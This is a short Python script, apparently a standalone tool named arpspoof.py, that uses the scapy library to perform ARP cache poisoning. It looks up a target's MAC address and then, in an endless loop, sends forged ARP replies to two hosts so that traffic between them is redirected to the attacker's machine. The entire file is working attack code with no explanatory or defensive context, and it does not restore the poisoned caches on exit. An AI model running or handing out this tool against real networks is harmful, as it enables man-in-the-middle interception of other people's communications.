import sys
import time
from scapy.all import ARP, send, Ether, srp

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
    for snd, rcv in ans:
        return rcv.hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def main():
    if len(sys.argv) != 3:
        print("Usage: arpspoof.py <target_ip> <spoof_ip>")
        sys.exit(1)
        
    target = sys.argv[1]
    spoof_ip = sys.argv[2]
    print(f"Spoofing {target} to think we are {spoof_ip}")
    try:
        while True:
            spoof(target, spoof_ip)
            spoof(spoof_ip, target)
            time.sleep(2)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
